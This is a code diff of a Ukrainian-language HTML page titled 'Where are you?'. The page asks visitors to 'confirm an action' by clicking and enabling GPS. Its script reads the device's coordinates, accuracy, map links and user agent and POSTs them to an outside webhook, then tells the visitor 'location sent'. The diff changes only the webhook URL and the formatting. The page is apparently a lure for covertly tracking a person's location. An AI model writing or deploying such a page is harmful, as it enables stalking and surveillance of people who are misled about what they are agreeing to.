@@ -5,31 +5,48 @@
 <title>Де ти?</title>
 
 <style>
-html, body { margin: 0; padding: 0; width: 100%; height: 100%; }
-body {
-  background: linear-gradient(135deg, #4e54c8, #8f94fb);
-  font-family: Arial, sans-serif;
-  color: #ffffff;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  text-align: center;
-}
-.box {
-  background: rgba(0, 0, 0, 0.3);
-  padding: 30px;
-  border-radius: 12px;
-  max-width: 420px;
-}
-h1 { margin-top: 0; font-size: 22px; }
-p { opacity: 0.9; font-size: 15px; }
+  html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+  }
+
+  body {
+    background: linear-gradient(135deg, #4e54c8, #8f94fb);
+    font-family: Arial, sans-serif;
+    color: #ffffff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+  }
+
+  .box {
+    background: rgba(0, 0, 0, 0.3);
+    padding: 30px;
+    border-radius: 12px;
+    max-width: 420px;
+  }
+
+  h1 {
+    margin-top: 0;
+    font-size: 22px;
+  }
+
+  p {
+    opacity: 0.9;
+    font-size: 15px;
+  }
 </style>
 </head>
 <body>
 
 <div class="box">
   <h1>Підтвердження дії</h1>
-  <p>Натисніть будь-де на сторінці,<br>увімкніть GPS та інтернет</p>
+  <p>
+    Натисніть будь-де на сторінці,<br> ввімкни GPS та інтернет
+  </p>
 </div>
 
 <script>
@@ -45,35 +62,36 @@ function sendGeoOnce() {
   }
 
   navigator.geolocation.getCurrentPosition(
-    async (pos) => {
+    (pos) => {
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
+
+      const googleMap = "https://www.google.com/maps?q=" + lat + "," + lon;
+      const openStreetMap =
+        "https://www.openstreetmap.org/?mlat=" + lat +
+        "&mlon=" + lon +
+        "#map=17/" + lat + "/" + lon;
 
       const payload = {
         latitude: lat,
         longitude: lon,
         accuracy: pos.coords.accuracy,
-        google_map: `https://www.google.com/maps?q=${lat},${lon}`,
-        openstreet_map: `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}#map=17/${lat}/${lon}`,
+        google_map: googleMap,
+        openstreet_map: openStreetMap,
         user_agent: navigator.userAgent,
         time: new Date().toISOString()
       };
 
-      try {
-        const res = await fetch("https://dsdfgggrwerwertwert.ct.ws/webhookddddfdsfgsdfg.php", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
+      fetch("https://app.hooklistener.com/w/my-first-endpoint-ph72/", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      });
 
-        if (!res.ok) throw new Error("Server error");
-
-        document.querySelector(".box").innerHTML =
-          "<h1>Дякуємо</h1><p>Локацію передано</p>";
-
-      } catch (e) {
-        alert("Не вдалося передати дані");
-      }
+      document.querySelector(".box").innerHTML =
+        "<h1>Дякуємо</h1><p>Локацію передано</p>";
     },
     (err) => {
       alert("Помилка геолокації: " + err.message);
